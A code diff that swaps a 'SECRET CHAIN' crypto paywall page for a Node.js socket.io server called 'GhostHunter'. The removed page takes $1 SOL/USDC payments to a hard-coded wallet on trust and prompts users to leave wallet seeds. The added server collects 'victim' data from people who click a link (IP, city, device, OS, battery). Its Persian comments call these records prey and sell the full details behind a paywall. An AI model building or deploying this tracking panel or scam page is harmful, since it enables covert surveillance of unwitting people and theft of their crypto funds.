@@ -1,152 +1,51 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE SECRET CHAIN</title>
-    <style>
-        body { background-color: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+const express = require('express');
+const http = require('http');
+const { Server } = require("socket.io");
+const path = require('path');
+
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+// ذخیره موقت شکارها (در رم سرور)
+let captures = [];
+
+io.on('connection', (socket) => {
+    
+    // وقتی کسی (صاحب لینک) وارد پنل میشه
+    socket.on('join-dashboard', () => {
+        // شکارهای قبلی رو بهش نشون بده
+        socket.emit('update-captures', captures);
+    });
+
+    // وقتی یک قربانی روی لینک کلیک کرد و اطلاعاتش اومد
+    socket.on('victim-data', (data) => {
+        const victimInfo = {
+            id: Date.now(),
+            ip: data.ip,
+            city: data.city || 'Unknown',
+            device: data.device,
+            os: data.os,
+            battery: data.battery + '%',
+            time: new Date().toLocaleTimeString(),
+            isPaid: false // اولش اطلاعات دقیق قفله
+        };
         
-        /* MYSTERY BOX */
-        .envelope-card {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            width: 90%;
-            max-width: 350px;
-            padding: 20px;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(255, 215, 0, 0.1);
-            position: relative;
-            animation: float 6s ease-in-out infinite;
-        }
-        
-        /* HEADER INFO */
-        .meta-info { display: flex; justify-content: space-between; font-size: 10px; color: #555; margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 10px;}
-        .tag-badge { background: #111; color: gold; padding: 5px 10px; border: 1px solid gold; border-radius: 50px; font-weight: bold; font-size: 11px; display: inline-block; margin-bottom: 15px;}
+        captures.unshift(victimInfo); // اضافه به اول لیست
+        if (captures.length > 20) captures.pop(); // فقط ۲۰ تای آخر رو نگه دار
 
-        /* BLURRED CONTENT */
-        .blur-container { position: relative; margin: 20px 0; border: 1px dashed #333; padding: 10px; border-radius: 5px;}
-        .blur-text { filter: blur(4px); opacity: 0.5; font-size: 13px; line-height: 1.6; user-select: none; pointer-events: none; color: lime;}
-        .lock-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 10; }
-        .lock-icon { font-size: 40px; text-shadow: 0 0 20px #000; }
+        // ارسال به داشبورد (صدای آژیر پخش میشه)
+        io.emit('new-capture', victimInfo);
+    });
 
-        /* BUTTONS */
-        .pay-btn { background: linear-gradient(45deg, #FFD700, #FFA500); border: none; width: 100%; padding: 15px; font-weight: bold; font-size: 16px; cursor: pointer; border-radius: 8px; color: #000; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); transition: 0.3s;}
-        .pay-btn:active { transform: scale(0.95); }
-        
-        /* INPUT FORM (HIDDEN) */
-        #write-form { display: none; width: 90%; max-width: 350px; text-align: center;}
-        textarea { width: 100%; height: 100px; background: #111; border: 1px solid #444; color: #fff; padding: 10px; border-radius: 5px; margin-bottom: 10px; resize: none; font-family: inherit;}
-        select { width: 100%; padding: 10px; background: #111; color: #fff; border: 1px solid #444; margin-bottom: 10px; border-radius: 5px;}
+    // وقتی کسی پول داد و خواست اطلاعات رو باز کنه
+    socket.on('unlock-data', (id) => {
+        // اینجا باید منطق پرداخت باشه. فعلا برای دمو باز میکنیم
+        io.emit('data-unlocked', id);
+    });
+});
 
-        /* MODAL */
-        #payModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .pay-box { border: 1px solid gold; padding: 25px; background: #000; width: 300px; border-radius: 15px; box-shadow: 0 0 30px rgba(255, 215, 0, 0.2); }
-        .wallet-addr { font-size: 10px; background: #111; padding: 8px; border: 1px solid #333; color: orange; margin: 10px 0; word-break: break-all; user-select: all; font-family: monospace;}
-
-        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
-    </style>
-</head>
-<body>
-
-    <div class="envelope-card" id="mainCard">
-        <div class="meta-info">
-            <span>✉️ SECRET #<span id="msgId">Loading...</span></span>
-            <span>📍 <span id="loc">Loading...</span></span>
-        </div>
-        
-        <span class="tag-badge" id="tag">...</span>
-        
-        <div class="blur-container">
-            <div class="lock-overlay"><div class="lock-icon">🔒</div></div>
-            <div class="blur-text" id="preview">
-                Loading encrypted data...<br>
-                Please wait...<br>
-                ...
-            </div>
-        </div>
-
-        <p style="font-size: 10px; color: #666; margin-bottom: 15px;">Only ONE person can open this. Once opened, it's gone forever.</p>
-        <button class="pay-btn" onclick="openPayment()">UNLOCK NOW ($1)</button>
-    </div>
-
-    <!-- FORM FOR NEXT USER -->
-    <div id="write-form">
-        <h2 style="color: lime;">🔓 UNLOCKED!</h2>
-        <p style="font-size: 11px; color: #ccc;">You saw the secret. Now leave one for the next person.</p>
-        
-        <select id="newTag">
-            <option value="💰 Crypto / Money">💰 I left some Money/Crypto</option>
-            <option value="❤️ Confession">❤️ A Secret Confession</option>
-            <option value="💀 Warning">💀 A Warning</option>
-            <option value="🤣 Just for Fun">🤣 Just for Fun</option>
-        </select>
-        
-        <textarea id="newContent" placeholder="Write here... (Example: Wallet seed, confession, or just 'Hi')"></textarea>
-        
-        <button class="pay-btn" style="background: lime;" onclick="submitSecret()">LEAVE SECRET & EXIT</button>
-    </div>
-
-    <!-- PAY MODAL -->
-    <div id="payModal">
-        <div class="pay-box">
-            <h3 style="color: gold; margin-top: 0;">PAYMENT REQUIRED</h3>
-            <p style="color: #ccc; font-size: 12px;">Send <b>$1 (SOL/USDC)</b> to reveal the hidden message.</p>
-            
-            <div class="wallet-addr">4jtjysarsDeReyKe1sjWJmSDbjFKqM23ReEN3b9GV7LU</div>
-            
-            <p style="font-size: 9px; color: #555;">Click address to copy. After sending, click below:</p>
-            
-            <a href="#" onclick="confirmPay()" style="display:block; background:#0088cc; color:white; padding:12px; text-decoration:none; margin-top:10px; font-weight: bold; border-radius: 5px; font-size: 14px;">✅ I SENT IT</a>
-            <br>
-            <span style="color:#555; cursor:pointer; font-size:11px;" onclick="closePayment()">Cancel</span>
-        </div>
-    </div>
-
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        const mainCard = document.getElementById('mainCard');
-        const writeForm = document.getElementById('write-form');
-        const payModal = document.getElementById('payModal');
-
-        socket.on('envelope-data', (data) => {
-            document.getElementById('msgId').innerText = data.id;
-            document.getElementById('loc').innerText = data.location;
-            document.getElementById('tag').innerText = data.tag;
-            document.getElementById('preview').innerText = data.preview;
-            
-            mainCard.style.display = 'block';
-            writeForm.style.display = 'none';
-        });
-
-        socket.on('open-success', (content) => {
-            alert("SECRET REVEALED:\n------------------\n" + content + "\n------------------");
-            mainCard.style.display = 'none';
-            writeForm.style.display = 'block';
-        });
-
-        function openPayment() { payModal.style.display = 'flex'; }
-        function closePayment() { payModal.style.display = 'none'; }
-        
-        function confirmPay() {
-            closePayment();
-            // اینجا کاربر ادعا میکنه پرداخت کرده.
-            // چون گفتی میخوای ساده باشه، فعلا اعتماد میکنیم و باز میکنیم.
-            // همزمان ربات تلگرام بهت خبر میده که چک کنی.
-            socket.emit('open-envelope');
-        }
-
-        function submitSecret() {
-            const content = document.getElementById('newContent').value;
-            const tag = document.getElementById('newTag').value;
-            if(!content) return alert("Write something!");
-            
-            socket.emit('submit-new-secret', { content: content, tag: tag });
-            alert("Your secret is safe with us. Goodbye.");
-            location.reload(); 
-        }
-    </script>
-</body>
-</html>
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log(`GhostHunter running on port ${PORT}`));
